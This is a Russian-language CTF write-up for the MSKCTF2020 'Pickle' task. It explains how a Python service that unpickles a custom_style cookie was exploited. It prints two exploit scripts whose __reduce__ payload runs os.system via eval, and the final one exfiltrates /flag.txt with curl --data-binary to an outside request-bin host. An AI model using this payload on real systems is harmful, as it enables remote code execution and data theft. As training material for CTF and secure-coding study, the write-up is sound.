## Pickle

Сразу после прочтения названия таска становится понятно, что он будет связан с "опасной" сериализацией в модуле pickle.

Немного осмотрев сервис, понимаем, что у нас есть возможность кастомизировать внешний вид текста на главной странице путем изменения параметров на /customize, которые в свою очередь сохраняются в куках. На этой же странице и происходит сериализация. Теперь нужно написать/нагуглить эксплойт. 

В интернете достаточно примеров эксплойтов, однако в процессе эксплуатации становится понятно, что некоторые модули(например, builtins) забанены, нужно искать другие пути. 

На странице документации пикла узнаем о возможности использования разных протоколов(0-5), отличающихся своей новизной. Попробуем наш эксплойт с 0ым протоколом.

```
import pickle
import base64

class Exp(object):
    def __reduce__(self):
        return (eval, ("""__import__('os').system('curl  http://pomo-mondreganto.me/request_bin/bin/3a7af4223a')""",),)


shellcode = pickle.dumps(Exp(), protocol=0)
print(base64.b64encode(shellcode))
```

Для этого пытаемся сделать eval(), c помощью которого импортируем os и вызваем system(). Следующая часть пейлоада - попытка отправить себе запрос на request-bin через curl. Копируем полученный base64 и заменяем значение куки custom_style.

Получаем запрос, значит эксплойт сработал. Осталось отправить себе флаг, однако для этого нужно понять, где он лежит. Пробуем несколько раз, получаем флаг. Для отправки файла себе я использовал опцию --data-binary.


#### Финальный эксплойт:
```
import pickle
import base64

class Exp(object):
    def __reduce__(self):
        return (eval, ("""__import__('os').system('curl --data-binary @"/flag.txt" http://pomo-mondreganto.me/request_bin/bin/3a7af4223a')""",),)


shellcode = pickle.dumps(Exp(), protocol=0)
print(base64.b64encode(shellcode))
```
#### В результате должен прийти такой запрос:

![Request example](https://github.com/WATyag/MSKCTF2020/blob/master/pickle/requestbin.jpg)

#### Флаг: MSKCTF{pickle_cant_be_easily_secured} 
